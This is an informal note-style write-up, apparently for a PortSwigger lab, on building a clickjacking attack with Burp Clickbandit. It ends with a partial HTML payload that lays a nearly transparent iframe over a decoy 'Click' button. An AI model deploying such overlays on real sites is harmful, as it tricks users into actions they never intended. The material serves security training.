...
click on burp, then on clickbandit. paste it into the console in the browser. you will then be able to "record" a clickjacking session. MAKE SURE YOU TICK **DISABLE CLICK ACTIONS!!!!**

record it, and then copy the code it generates. 
Decode the src from Base64 and adjust the url to the correct one. Paste the updated code into exploit server. 

After you've verified the that the exploit looks good, send it to the vicim and WAIT FOR FUCKING AGES BECAUSE PORTSWIGGER :))))))))))))))))))))

```
<div id="container" style="clip-path: inset(200px 346px 233px 200px); clip: rect(200px, 346px, 233px, 200px); overflow: hidden; position: absolute; left: 0px; top: 0px; width: 100%; height: 100%;">
...
<div id="clickjack_button" style="opacity: 1; transform-style: preserve-3d; text-align: center; font-family: Arial; font-size: 100%; width: 146px; height: 33px; z-index: 0; background-color: red; color: rgb(255, 255, 255); position: absolute; left: 200px; top: 200px;"><div style="position:relative;top: 50%;transform: translateY(-50%);">Click</div></div>
...
<iframe id="parentFrame" src="data:text/html;base64," frameborder="0" scrolling="no" style="transform: scale(1); transform-origin: 200px 200px; opacity: 0.0001; border: 0px; position: absolute; z-index: 1; width: 1259px; height: 747px; left: 0px; top: 0px;"></iframe>
</div>
